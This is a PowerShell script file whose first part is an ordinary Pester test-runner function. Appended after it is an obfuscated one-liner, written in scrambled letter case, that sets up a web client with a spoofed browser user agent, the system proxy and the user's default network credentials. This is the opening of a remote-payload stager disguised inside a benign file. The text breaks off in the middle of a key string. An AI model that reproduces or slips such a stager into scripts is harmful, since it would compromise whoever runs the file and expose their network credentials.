function Start-PesterTest
{
	
	[CmdletBinding()]
	param (
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[ValidateScript({ Test-Path -Path $_ })]
		[string]$Path,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$ComputerName,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[pscredential]$Credential,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$DomainName,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$TestName,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string[]]$ExcludeTag = 'Disabled',
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string[]]$Tag
	)
	process
	{
		$scriptParams = @{ }
		if ($PSBoundParameters.ContainsKey('ComputerName')) {
			$scriptParams = @{ 'ComputerName' = $ComputerName }
		}
		
		if ($PSBoundParameters.ContainsKey('Credential'))
		{
			$scriptParams.Credential = $Credential
		}
		if ($PSBoundParameters.ContainsKey('DomainName'))
		{
			$scriptParams.DomainName = $DomainName
		}
		
		$pesterScrParams = @{ 'Path' = $Path }
		if ($scriptParams.Keys)
		{
			$pesterScrParams.Parameters = $scriptParams
		}
		
		$invPesterParams = @{
			'Script' = $pesterScrParams
			'ExcludeTag' = $ExcludeTag
		}
		
		if ($PSBoundParameters.ContainsKey('Tag'))
		{
			$invPesterParams.Tag = $Tag
		}
		
		if ($PSBoundParameters.ContainsKey('TestName'))
		{
			$invPesterParams.TestName = $TestName
		}
		
		Invoke-Pester @invPesterParams
	}
}
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

